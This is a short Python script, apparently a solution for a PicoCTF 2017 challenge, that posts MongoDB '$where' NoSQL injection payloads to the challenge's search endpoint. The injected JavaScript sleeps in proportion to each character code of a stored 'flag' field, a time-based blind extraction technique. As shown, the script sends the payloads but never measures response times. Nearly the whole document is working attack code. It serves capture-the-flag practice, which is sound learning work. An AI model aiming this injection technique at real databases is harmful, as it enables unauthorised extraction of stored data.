#! /usr/bin/env python3
##
# Script for PicoCTF A Kaley Ceilidh challenge
# Created by Amos (LFlare) Ng
##
import requests
import json

url = "http://shell2017.picoctf.com:8080/search"
payload_function = "function() { if(this.flag) { sleep(this.flag.charCodeAt(%d) * 20);} return true; }"

for i in range(32): # We assume flag won't be that long
    payload = {"$where": payload_function % i}
    print(json.dumps(payload))
    r = requests.post("http://shell2017.picoctf.com:8080/search", json=json.dumps(payload))